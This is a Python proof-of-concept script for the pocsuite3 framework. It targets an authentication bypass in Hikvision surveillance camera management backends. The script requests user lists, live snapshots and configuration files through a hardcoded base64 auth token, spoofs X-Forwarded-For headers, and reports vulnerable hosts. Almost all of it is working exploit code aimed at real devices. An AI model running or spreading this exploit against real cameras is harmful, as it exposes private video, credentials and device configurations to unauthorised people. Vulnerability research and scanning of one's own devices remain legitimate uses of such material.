#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import contextlib
from poc_tool.tools import tools
from pocsuite3.api import (
    minimum_version_required, POCBase, register_poc, requests, logger
)

minimum_version_required('2.0.5')


class DemoPOC(POCBase):
    vulID = '0'
    version = '1'
    author = ''
    vulDate = '2023-11-17'
    createDate = '2023-11-17'
    updateDate = '2023-11-17'
    references = []
    name = '海康威视摄像头管理后台未授权'
    appPowerLink = ''
    appName = '海康威视'
    appVersion = 'HIKVISION-视频监控'
    vulType = 'Other'
    desc = """
    杭州海康威视系统技术有限公司摄像头管理后台存在未授权，通过构造url可绕过登录查看监控，检索所有用户和配置文件下载。
    """
    samples = ['']
    install_requires = ['']
    pocDesc = 'User manual of poc'
    dork = {'zoomeye': ''}
    suricata_request = ''
    suricata_response = ''

    def _exploit(self):
        headers = {
            'User-agent': tools.get_random_ua(),
            'X-Forwarded-For': tools.get_random_ip()
        }
        urls = [
            '/Security/users?auth=YWRtaW46MTEK',
            '/onvif-http/snapshot?auth=YWRtaW46MTEK',
            '/System/configurationFile?auth=YWRtaW46MTEK'
        ]
        res1 = requests.get(url=f"{self.url}{urls[0]}", headers=headers, verify=False)
        res2 = requests.get(url=f"{self.url}{urls[1]}", headers=headers, verify=False)
        res3 = requests.get(url=f"{self.url}{urls[2]}", headers=headers, verify=False)
        logger.debug(f"\n\n{tools.get_req(res1)}\n\n{tools.get_res(res1)}")
        logger.debug(f"\n\n{tools.get_req(res2)}\n\n{tools.get_res(res2)}")
        logger.debug(f"\n\n{tools.get_req(res3)}\n\n{tools.get_res(res3)}")
        if "<userName>admin</userName>" in res1.text and "priority" in res1.text and res1.status_code == 200:
            return True
        elif res2.headers['Content-Type'] == 'image/jpeg' and 'Content-Length' in res2.headers and res2.status_code == 200:
            return True
        elif res3.status_code == 200 and res3.headers['Content-Type'] == 'application/binary; charset="UTF-8"' and 'Content-Length' in res3.headers:
            return True

    def _verify(self):
        with contextlib.suppress(Exception):
            result = {}
            res = self._exploit()
            if res:
                result['VerifyInfo'] = {
                    '[ Success ] 海康威视摄像头管理后台未授权': self.url,
                    '[ Payload ]': "\n" + '/Security/users?auth=YWRtaW46MTEK' + "\n" + '/onvif-http/snapshot?auth=YWRtaW46MTEK' + "\n"+'/System/configurationFile?auth=YWRtaW46MTEK'
                }
            return self.parse_output(result)

    def _attack(self):
        return self._verify()

    def _shell(self):
        return self._verify()


register_poc(DemoPOC)
